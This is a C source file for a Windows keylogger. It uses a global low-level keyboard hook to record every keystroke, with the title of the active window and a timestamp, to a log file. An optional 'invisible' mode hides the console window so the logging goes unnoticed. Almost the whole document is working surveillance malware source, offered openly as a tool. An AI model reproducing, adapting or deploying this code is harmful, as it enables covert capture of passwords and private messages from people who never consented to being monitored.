#include <time.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winuser.h>

// defines whether the window is visible or not
#define visible // (visible / invisible)

// variable to store the hadnler of the hook
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
FILE *OUTPUT_FILE;

// saves the last window title
char lastwindow[256];

// callback function for hooks
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    // checks if the action hook is valid and the button is pressed
    if (nCode >= 0 && wParam == WM_KEYDOWN) {

        // get information about the pressed button
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

        // saves the button information to a file
        Save(kbdStruct.vkCode);
    }

    // continue to the next hook
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// initialize the hook
void SetHook() 
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
    }
}

// remove hook
void ReleaseHook() {
    UnhookWindowsHookEx(_hook); 
}

// saves keystrokes to a file
int Save(int key_stroke)
{

    // buffer for window titles
    char lastwindow[256];

    // ignoring mouse clicks
    if ((key_stroke == 1) || (key_stroke == 2)) return 0;

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout;

    if (foreground) 
    {
        // get the thread ID of the active window
        threadID = GetWindowThreadProcessId(foreground, NULL);

        // get the keyboard layout from the thread
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];

        // get the window title
        GetWindowText(foreground, window_title, sizeof(window_title));

        // if the window title changes
        if (strcmp(window_title, lastwindow) != 0)
        {

            // saves the new window title
            strcpy(lastwindow, window_title);

            // get time
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);

            // writes the window title and time to a file
            fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
        }
    }

    // displays the button code in the console
    printf("%d\n", key_stroke);

    // saves the button representation to a file
    if (key_stroke == VK_BACK)
        fprintf(OUTPUT_FILE, "[BACKSPACE]");
    else if (key_stroke == VK_RETURN)
        fprintf(OUTPUT_FILE, "\n");
    else if (key_stroke == VK_SPACE)
        fprintf(OUTPUT_FILE, " ");
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "[TAB]");
    else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
        fprintf(OUTPUT_FILE, "[SHIFT]");
    else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
        fprintf(OUTPUT_FILE, "[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "[ESCAPE]");
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "[END]");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "[HOME]");
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "[LEFT]");
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "[UP]");
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "[RIGHT]");
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
        fprintf(OUTPUT_FILE, ".");
    else if (key_stroke == 189 || key_stroke == 109)
        fprintf(OUTPUT_FILE, "-");
    else if (key_stroke == 20)
        fprintf(OUTPUT_FILE, "[CAPSLOCK]");
    else 
    {
        char key;

        // check capslock status
        boolean lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        if (
            (GetKeyState(VK_SHIFT)  & 0x1000) != 0 ||
            (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_RSHIFT) & 0x1000) != 0
        ) lowercase = !lowercase;

        // change key stroke code into characters
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // change characters to lowercase
        if (!lowercase) key = tolower(key);

        fprintf(OUTPUT_FILE, "%c", key);
    }

    fflush(OUTPUT_FILE);
    return 0;
}

void Stealth() {
    #ifdef visible
        // display window
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
    #endif

    #ifdef invisible
        // hide the window
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    #endif
}

int main(int argc, char* argv[]) {
    const boolean help = (
        !strcmp(argv[1], "-h") ||
        !strcmp(argv[1], "--help")
    );

    if ((boolean) help) printf("example: kylg_winapi [-o | --out-log] [logname]\n");

    const boolean out_log = (  
        !strcmp(argv[1], "-o") ||
        !strcmp(argv[1], "--out-log")
    );

    const char* log_file;
    if ((boolean) out_log) log_file = argv[2];
    else return 0;

    OUTPUT_FILE = fopen(log_file, "a");

    Stealth(); SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}

    fclose(OUTPUT_FILE);
    return 0;
}
